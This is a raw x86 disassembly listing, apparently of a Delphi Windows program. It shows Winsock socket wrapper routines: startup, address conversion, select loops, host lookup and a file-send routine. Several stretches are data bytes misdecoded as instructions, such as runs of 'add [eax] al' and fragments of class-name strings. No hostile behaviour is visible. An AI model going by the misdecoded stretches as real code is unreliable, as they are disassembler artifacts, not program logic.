mov esi eax
mov eax [ esi + 0xc ]
call sub_40316c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40315c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_4641c0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4043f0
xor eax eax
push ebp
push sub_464208
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x80 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46420f
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
sub_464218
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46423d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464244
retn
sub_464250
pushfd
inc edx
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + eax * 2 + 0x1080046 ] ch
add [ eax ] al
cmp [ eax ] bh
inc esi
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ eax + 0x40004651 ] ch
push ecx
inc esi
add [ eax ] dl
push edx
inc esi
add [ ecx + edx * 2 + 0x54140046 ] ah
dec ecx
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
add [ ecx + esi ] al
inc eax
add [ eax ] ah
xor [ eax ] eax
push 0x6c004644
dec ebp
inc esi
imul esi [ ebx + 0x74 ] 0x646e6957
outsd
ja r-xdata
xchg ebp eax
insb
arpl [ ebx + 0x57 ] bp
imul ebp [ esi + 0x64 ] 0x5573776f
mov ebp esp
add esp 0xfffffe6c
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x194 ] ecx
test dl dl
je r-xdata
inc edi
inc esi
add ah dh
inc esi
inc esi
add [ ebx + ecx * 2 + 0x46 ] al
add [ esp + ecx * 2 + 0x46 ] cl
add [ ebx + ecx * 2 ] ch
inc esi
add [ eax + 0x38004647 ] al
dec ebx
inc esi
add [ ebp + ecx * 2 + 0x46 ] dl
add [ eax + 0x4d ] ah
inc esi
add [ edi + eax * 2 + 0x47a80046 ] cl
inc esi
add [ ecx + ecx * 2 ] ah
inc esi
add [ edx + ecx * 2 ] bh
inc esi
add [ eax + 0x4a ] bl
inc esi
add ah al
dec edx
inc esi
add [ ebx + ecx * 2 ] dl
inc esi
add ah dl
dec edi
inc esi
add [ edx + edx * 2 + 0x46 ] al
add [ eax ] cl
dec ebx
inc esi
add al ah
dec edi
inc esi
add [ eax + 0x20004650 ] al
push ecx
inc esi
add [ eax - 0x7ffb9bc ] dl
dec esi
inc esi
add [ edi ] cl
push esp
dec ecx
push ebx
je r-xdata
inc esp
add [ esi + ecx * 2 ] dl
inc esi
add ah ah
dec edx
inc esi
add [ ebx + eax * 2 + 0x45400046 ] ah
inc esi
add al dl
inc ebp
inc esi
add [ esi + eax * 2 ] bh
inc esi
add [ eax + 0x46 ] cl
inc esi
add [ eax + 0x44004646 ] bl
lea eax [ eax ]
adc [ ebx + 0x46 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + eax * 2 + 0x100046 ] dl
add [ eax ] al
movsb [ edi ] [ esi ]
cmp [ esi ] al
mov ah 0x33
inc eax
add al al
xor eax [ eax ]
les esi [ ebx ]
inc eax
add al cl
xor eax [ eax ]
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ eax + 0x44 ] ch
inc esi
add [ ebp + ecx * 2 + 0x46 ] ch
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_464442
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_463bdc
cmp [ rw-data ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_403490
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464449
lea eax [ ebp - 0x194 ]
call sub_403f40
retn
lea eax [ ebp - 0x18e ]
push eax
push 0x202
call sub_4636ac
inc eax
jne r-xdata
mov [ rw-data ] 0x1
lea edx [ ebp - 0x194 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x194 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
sub_464468
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_464190
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_464490
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov ebx edx
xor eax eax
push ebp
push sub_464524
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov al [ ebx ]
lea edx [ ebp - 0x4 ]
call sub_408388
push [ ebp - 0x4 ]
push r-xdata
xor eax eax
mov al [ ebx + 0x1 ]
lea edx [ ebp - 0x8 ]
call sub_408388
push [ ebp - 0x8 ]
push r-xdata
xor eax eax
mov al [ ebx + 0x2 ]
lea edx [ ebp - 0xc ]
call sub_408388
push [ ebp - 0xc ]
push r-xdata
xor eax eax
mov al [ ebx + 0x3 ]
lea edx [ ebp - 0x10 ]
call sub_408388
push [ ebp - 0x10 ]
mov eax esi
mov edx 0x7
call sub_4042c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46452b
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403f64
retn
sub_464537
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffffe4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_4645bf
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x10
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
lea ecx [ ebp - 0x1c ]
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_403f94
mov ax [ ebp - 0x16 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4645c6
lea eax [ ebp - 0x1c ]
call sub_403f40
retn
sub_4645d0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov ax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] ax
mov eax esi
call sub_404200
test eax eax
jne r-xdata
mov edx esi
mov eax ebx
call sub_4641c0
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov ax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x12 ] ax
push 0x10
lea eax [ ebp - 0x14 ]
push eax
push edi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_464648
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebp - 0x10 ] cx
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_4641c0
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0xc ] eax
mov ax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0xe ] ax
push 0x10
lea eax [ ebp - 0x10 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_464698
push ebx
push esi
push edi
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov eax edi
call sub_404400
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ eax + 0xc ]
mov eax [ eax ]
mov dl [ eax ]
mov [ esp ] dl
mov dl [ eax + 0x1 ]
mov [ esp + 0x1 ] dl
mov dl [ eax + 0x2 ]
mov [ esp + 0x2 ] dl
mov al [ eax + 0x3 ]
mov [ esp + 0x3 ] al
mov ecx esi
mov edx esp
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
or edx 0xffffffff
mov eax ebx
call sub_463abc
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_4646f4
push ebx
push esi
push edi
push ecx
mov edi ecx
mov ebx edx
mov esi eax
mov eax ebx
call sub_404400
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ esp ] eax
push 0x2
push 0x4
lea eax [ esp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
test ebx ebx
jne r-xdata
mov eax edi
mov edx [ ebx ]
call sub_404138
or edx 0xffffffff
mov eax esi
call sub_463abc
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_464744
push ebx
mov ebx edx
mov eax ebx
mov edx 0xfa
call sub_40458c
mov eax [ ebx ]
call sub_404200
push eax
mov eax [ ebx ]
call sub_404400
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebx ]
call sub_404400
mov edx eax
mov eax ebx
call sub_404138
pop ebx
retn
sub_46478c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0x8
sub_4647a8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_464833
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x10
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
lea ecx [ ebp - 0x1c ]
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp + 0xc ]
call sub_403f94
mov ax [ ebp - 0x16 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46483a
lea eax [ ebp - 0x1c ]
call sub_403f40
retn
sub_464844
push ebx
push esi
push edi
mov ebx edx
mov edi eax
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx [ eax ]
call [ edx + 0x8 ]
mov edx [ ebx ]
mov eax edi
call sub_418050
mov esi [ ebx ]
dec esi
test esi esi
jl r-xdata
inc esi
lea eax [ ebx + 0x4 ]
mov ebx eax
mov edx [ ebx ]
mov eax edi
call sub_417d38
add ebx 0x4
dec esi
jne r-xdata
sub_464880
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_464915
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46491c
lea eax [ ebp - 0xc ]
call sub_403f40
retn
cmp [ edi + 0x8 ] 0x40
jle r-xdata
mov esi [ edi + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
mov eax [ edi + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
inc esi
mov [ ebp - 0x8 ] 0x0
mov ebx [ ebp - 0x4 ]
add ebx 0x4
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_417e94
mov [ ebx ] eax
inc [ ebp - 0x8 ]
add ebx 0x4
dec esi
jne r-xdata
sub_464924
push ebp
mov ebp esp
add esp 0xfffffcec
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx [ ebp + 0x8 ]
lea eax [ ebp - 0x10c ]
xor ecx ecx
mov edx 0x104
call sub_402b80
lea eax [ ebp - 0x210 ]
xor ecx ecx
mov edx 0x104
call sub_402b80
lea eax [ ebp - 0x314 ]
xor ecx ecx
mov edx 0x104
call sub_402b80
lea edx [ ebp - 0x10c ]
mov eax esi
call sub_464880
lea edx [ ebp - 0x210 ]
mov eax edi
call sub_464880
lea edx [ ebp - 0x314 ]
mov eax [ ebp + 0xc ]
call sub_464880
cmp ebx 0xfffffffe
jne r-xdata
mov eax ebx
mov ecx 0x3e8
cdq
idiv ecx
mov [ ebp - 0x8 ] eax
mov eax ebx
mov ecx 0x3e8
cdq
idiv ecx
imul eax edx 0x3e8
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x210 ]
push eax
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
push 0x0
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x210 ]
push eax
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
jmp r-xdata
lea edx [ ebp - 0x10c ]
mov eax esi
call sub_464844
lea edx [ ebp - 0x210 ]
mov eax edi
call sub_464844
lea edx [ ebp - 0x314 ]
mov eax [ ebp + 0xc ]
call sub_464844
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_464a3c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0x8
sub_464a58
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
xor ecx ecx
mov edx 0x10
call sub_402b80
mov [ ebp - 0x10 ] 0x2
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_4641c0
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0xc ] eax
mov ax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0xe ] ax
push 0x10
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
push edi
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_464ac4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0xc
sub_464ae4
push ebx
mov ebx eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0xc ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ ebx + 0xc ] eax
sub_464b44
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
xor eax eax
push ebp
push sub_464c11
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0x4 ]
call sub_404400
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
push ebp
push j_sub_403738#8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4084c4
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ax [ ebx + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464c18
lea eax [ ebp - 0x10 ]
call sub_403f40
retn
sub_464bb9
add [ eax ] eax
add [ eax ] al
je r-xdata
inc [ eax ]
add [ eax ] al
add [ esi ] cl
dec ecx
push ebx
je r-xdata
inc eax
add ch al
dec ebx
inc esi
add [ ebx + 0x4589fc45 ] cl
hlt
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
test esi esi
je r-xdata
arpl [ ebx + 0x57 ] bp
imul ebp [ esi + 0x64 ] 0x9073776f
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
xor eax eax
push ebp
push sub_464d41
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_405224
xor eax eax
push ebp
push j_sub_40360c#5
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push ebx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
push eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea eax [ ebp - 0xc ]
mov edx [ esi ]
call sub_404138
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor ebx ebx
lea eax [ ebp - 0x8 ]
mov edx [ esi + 0x4 ]
mov ecx [ r-xdata ]
call sub_405260
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464d48
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f64
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_405224
retn
mov eax [ ebp - 0x8 ]
mov esi [ eax + ebx * 4 ]
test esi esi
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx esi
call sub_404138
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
inc ebx
sub_464d0b
mov eax [ ebp - 0x4 ]
call sub_40316c
call sub_403974
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464d48
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f64
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_405224
retn
sub_464d6c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_464e06
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx + 0x44 ]
lea edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov eax [ ebp - 0x8 ]
call sub_404400
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ eax + 0xc ]
mov [ ebp - 0x4 ] eax
xor esi esi
jmp r-xdata
or edx 0xffffffff
mov eax ebx
call sub_463abc
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + esi * 4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464e0d
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_403f64
retn
lea ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + esi * 4 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x7c ]
mov edx [ ebp - 0xc ]
mov eax [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
inc esi
sub_464e14
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
mov ecx esi
xor edx edx
mov ebx [ eax ]
call [ ebx + 0xc ]
pop esi
pop ebx
retn
sub_464e30
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4043f0
xor eax eax
push ebp
push sub_464ee6
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
push 0x0
push 0x8000080
push 0x3
push 0x0
push 0x1
push 0x80000000
mov eax [ ebp - 0x4 ]
call sub_404400
push eax
call CreateFileA
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_464ec9
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
push eax
push ebx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464ed0
mov eax [ ebp - 0xc ]
push eax
call CloseHandle
retn
push 0x0
mov eax [ ebp - 0xc ]
push eax
call GetFileSize
mov [ ebp - 0x8 ] eax
sub_464ef8
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x4 ]
call sub_4043f0
xor eax eax
push ebp
push sub_464fbb
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_4657a4
mov eax [ ebp - 0x8 ]
call sub_4084c4
mov [ ebx ] al
push 0x1
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_4657a4
mov eax [ ebp - 0xc ]
call sub_4084c4
mov [ ebx + 0x1 ] al
push 0x1
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_4657a4
mov eax [ ebp - 0x10 ]
call sub_4084c4
mov [ ebx + 0x2 ] al
push 0x1
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_4657a4
mov eax [ ebp - 0x14 ]
call sub_4084c4
mov [ ebx + 0x3 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464fc2
lea eax [ ebp - 0x14 ]
mov edx 0x5
call sub_403f64
retn
sub_464fe0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46506e
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x4 ] 0x10
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax ebx
call sub_463abc
movzx eax [ ebp - 0x14 ]
mov [ edi ] eax
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0xc ]
call sub_403f94
mov ax [ ebp - 0x12 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465075
lea eax [ ebp - 0x18 ]
call sub_403f40
retn
sub_465080
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46510e
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x4 ] 0x10
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax ebx
call sub_463abc
movzx eax [ ebp - 0x14 ]
mov [ edi ] eax
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0xc ]
call sub_403f94
mov ax [ ebp - 0x12 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465115
lea eax [ ebp - 0x18 ]
call sub_403f40
retn
sub_465120
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0xc
sub_465140
push ebp
mov ebp esp
push 0x0
xor ecx ecx
push ebp
push sub_46519a
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ eax + 0x4 ] 0x40
jl r-xdata
mov ecx [ eax + 0x4 ]
mov [ eax + ecx * 4 + 0x8 ] edx
inc [ eax + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4651a1
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
sub_4651a8
push ebp
mov ebp esp
push 0x0
push ebx
xor ecx ecx
push ebp
push sub_465202
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
cmp edx [ eax + 0x4 ]
jge r-xdata
mov ebx [ eax + edx * 4 + 0x8 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465209
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
sub_465210
push ebx
push esi
mov esi [ eax + 0x4 ]
dec esi
test esi esi
jl r-xdata
pop esi
pop ebx
retn
inc esi
xor ecx ecx
inc ecx
dec esi
jne r-xdata
dec [ eax + 0x4 ]
mov edx [ eax + 0x4 ]
mov edx [ eax + edx * 4 + 0x8 ]
mov [ eax + ecx * 4 + 0x8 ] edx
mov edx [ eax + 0x4 ]
xor ebx ebx
mov [ eax + edx * 4 + 0x8 ] ebx
pop esi
pop ebx
retn
cmp edx [ eax + ecx * 4 + 0x8 ]
jne r-xdata
sub_465244
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
mov ebx ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_4652e5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
sub eax 0x2af9
jne r-xdata
mov ecx ebx
mov edx esi
mov eax edi
call sub_463c80
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405d94
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4652ec
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f64
retn
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405d94
mov eax [ ebp - 0x8 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0x0
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
pop eax
call sub_409118
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_403f94
sub_4652f4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46532d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
